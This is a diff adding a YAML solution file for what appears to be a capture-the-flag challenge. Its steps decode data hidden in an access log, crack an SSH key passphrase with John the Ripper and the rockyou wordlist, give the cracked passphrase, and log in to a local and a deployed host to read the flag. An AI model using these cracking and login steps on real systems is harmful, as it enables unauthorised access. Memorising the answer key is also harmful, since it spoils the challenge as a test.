@@ -1,0 +1,30 @@
+config:
+  setup:
+    - "./setup.sh"
+  shutdown:
+    - "./shutdown.sh"
+
+solve:
+  extractor:
+    - "grep -oP '/%(?!20)[0-9a-fA-F]{2}\b' access.log | cut -c 3- | xxd -r -p"
+    - "sed -n '17711p' access.log \
+        | awk '{print $7}' \
+        | perl -pe 's/%([0-9A-Fa-f]{2})/chr(hex($1))/eg' \
+        | cut -c 3-"
+  crack_ssh:
+    - "ssh2john id_rsa > id_rsa.hash"
+    - "john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt"
+    - "john --show id_rsa.hash"
+  cracked_passphrase: 12344321
+  add_permission:
+    - "chmod 600 id_rsa"
+  connect:
+    local:
+      - "ssh -i id_rsa leus@localhost -p 7151"
+    deployed:
+      - "ssh -i id_rsa leus@103.185.53.181 -p 7151"
+    shell:
+      - "(tac/more) flag.txt"
+    troubleshoot:
+      known_hosts:
+        - "rm ~/.ssh/known_hosts*"
